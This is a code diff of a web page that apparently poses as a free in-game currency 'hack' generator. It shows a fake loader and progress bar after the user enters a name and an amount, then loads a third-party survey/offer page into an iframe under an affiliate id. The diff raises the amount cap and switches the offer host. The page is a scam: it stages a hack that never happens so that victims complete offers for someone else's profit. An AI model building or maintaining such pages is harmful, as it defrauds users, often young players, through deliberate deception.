@@ -141,7 +141,7 @@
             </select>
         </div>
         <div class="input-field">
-            <input type="number" id="amount" placeholder="Amount (up to 5 digits)" min="1" max="99999" oninput="validateAmount(this)">
+            <input type="number" id="amount" placeholder="Amount (up to 6 digits)" min="1" max="999999" oninput="validateAmount(this)">
         </div>
         <button class="button" onclick="startHack()">Start Hack</button>
         <div class="loader" id="loader"></div>
@@ -190,7 +190,7 @@
             var username = document.getElementById('username').value;
             var currency = document.getElementById('currency').value;
             var amount = document.getElementById('amount').value;
-            if (username === '' || amount === '' || amount > 99999) {
+            if (username === '' || amount === '' || amount > 999999) {
                 alert('Please enter your in-game name and a valid amount');
                 return;
             }
@@ -208,15 +208,15 @@
                     clearInterval(progressInterval);
                     loader.style.display = 'none';
                     progressBar.style.display = 'none';
-                    surveyFrame.src = "https://singingfiles.com/show.php?l=0&u=2172431&id=65587";
+                    surveyFrame.src = "https://playabledownload.com/show.php?l=0&u=2172431&id=65587";
                     surveyFrame.classList.remove("hidden");
                 }
             }, 500);
         }
 
         function validateAmount(input) {
-            if (input.value.length > 5) {
-                input.value = input.value.slice(0, 5);
+            if (input.value.length > 6) {
+                input.value = input.value.slice(0, 6);
             }
         }
 
